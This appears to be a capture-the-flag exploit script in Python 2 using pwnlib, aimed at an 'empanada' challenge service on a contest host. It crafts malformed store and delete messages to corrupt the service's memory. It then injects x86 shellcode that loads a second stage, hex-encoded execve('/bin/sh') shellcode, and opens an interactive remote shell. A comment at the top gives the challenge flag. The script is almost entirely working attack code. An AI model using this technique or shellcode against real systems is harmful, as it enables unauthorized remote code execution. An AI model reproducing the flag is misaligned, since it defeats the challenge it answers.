from pwnlib import *

# The flag is: 7457y_l471n_4m3r1c4n_7r347_0r_d00msd4y_d3v1c3 

STORE_MSG = 16
GET_ONE = 48
DELETE_MSG = 80
GET_ALL = 96
CLEAR_INVALID = 254

def make_msg(data, msg_type, index=0, mtype=0x80):
	size = len(data)
	size += 1 # for the type
	assert index <= 3
	assert (size & 0b11111) == size
	msg  = chr(mtype | size | (index << 5))
	msg += chr(msg_type)
	msg += data
	return msg

def store(data):
	print "storing", data
	msg = make_msg(data, STORE_MSG)
	s.send(msg)
	s.ru("_[StoreMessage] => Return: SucceBs")

def delete(n):
	msg = make_msg(chr(n), DELETE_MSG)
	s.send(msg)
	s.ru("_[DeleteMessage] => Return: SuccCss")


#s = Socket(("localhost", 6767))
s = Socket(("empanada_45e50f0410494ec9cfb90430d2e86287.quals.shallweplayaga.me", 47281))
raw_input("> ")


store("0"*2)
store("1"*6)
store("2"*4)

msg1 = make_msg(pd(0x41313371), STORE_MSG, index=1)
msg2 = make_msg("CCCC", STORE_MSG, index=0, mtype=0)

s.send(msg1)
s.send(msg2)
s.ru("_[StoreMessage] => Return: SucceBs")

s.send(msg1)
s.send(msg2)
s.ru("_[StoreMessage] => Return: SucceBs")

s.send(make_msg("", CLEAR_INVALID))
s.ru("[ClearInvalid] => Return: ")

s.send(make_msg("", GET_ALL))

shellcode = assemble("""
mov eax, 3
mov ebx, 0
mov ecx, 0x313371cc
mov edx, 0x100
int 0x80
nop
nop
nop
nop
""", "x86")

store("Y"*0x10 + assemble("mov eax, 0x313371b4\n jmp eax", "x86"))
store(shellcode)

s.send(make_msg("", CLEAR_INVALID))


stage2 = assemble("""
int3
int3
int3
""", "x86")

raw_input("> ")

stage2 = "6a0b589952682f2f7368682f62696e89e3525389e1cd80".decode("hex")

s.send(stage2)


s.interact()
